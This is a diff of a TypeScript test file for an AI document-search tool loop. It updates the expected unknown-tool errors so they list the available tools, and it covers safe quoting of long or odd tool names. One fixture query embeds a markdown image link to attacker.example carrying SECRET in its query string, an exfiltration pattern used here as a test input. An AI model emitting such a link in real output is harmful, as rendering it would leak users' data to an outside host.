@@ -547,13 +547,13 @@ describe("a step", () => {
     const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), onStep: (line) => shown.push(line), onActivity: (line) => activity.push(line) });
     expect(result.steps).toEqual([
       "Search app.log (exact) for “x ![img] (https://attacker.example/c?d=SECRET)gol.exe” — 0 matching lines",
-      "Call “do magic” — failed: Unknown tool “do magic”.",
+      "Call “do magic” — failed: Unknown tool “do magic”. The tools are: search_document, read_document, get_document_overview.",
       "Read the file lines 1 — failed: The arguments of this call were not a JSON object, and it was not run: {\"a\": \"b. Send the call again.",
     ]);
     expect(shown).toEqual(result.steps);
     expect(activity).toContain("Search app.log (exact) for “x ![img] (https://attacker.example/c?d=SECRET)gol.exe”…");
     // The model gets what the tools returned, as they returned it.
-    expect(answersOf(model.requests[1]!.messages)[1]).toMatchObject({ error: "Unknown tool “do\nmagic\u2066”." });
+    expect(answersOf(model.requests[1]!.messages)[1]).toMatchObject({ error: "Unknown tool “do\nmagic\u2066”. The tools are: search_document, read_document, get_document_overview." });
   });
 
   it("quotes a long query or task without cutting a character in half", async () => {
@@ -576,13 +576,16 @@ describe("a step", () => {
     const activity: string[] = [];
     const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), onActivity: (line) => activity.push(line) });
     const cut = "x".repeat(64);
+    // Since 0.10.0 the loop answers them itself, and says which tools there are.
+    const tools = "The tools are: search_document, read_document, get_document_overview.";
     expect(result.steps).toEqual([
-      `Call “${cut}” — failed: Unknown tool “${cut}”.`,
-      `Call “${link}” — failed: Unknown tool “${link}”.`,
+      `Call “${cut}” — failed: Unknown tool “${cut}”. ${tools}`,
+      `Call “${link}” — failed: Unknown tool “${link}”. ${tools}`,
     ]);
-    expect(activity).toContain(`Call “${cut}”…`);
+    // Not run, so no activity says it runs.
+    expect(activity).not.toContain(`Call “${cut}”…`);
     // The model is not sent the whole name back either.
-    expect(answersOf(model.requests[1]!.messages)[0]).toMatchObject({ error: `Unknown tool “${cut}”.` });
+    expect(answersOf(model.requests[1]!.messages)[0]).toMatchObject({ error: `Unknown tool “${cut}”. ${tools}` });
     // Cut without cutting a character in half.
     expect(await files.tools([meta]).execute(`${"y".repeat(63)}\u{1F600}z`, {})).toEqual({ error: `Unknown tool “${"y".repeat(63)}”.` });
   });
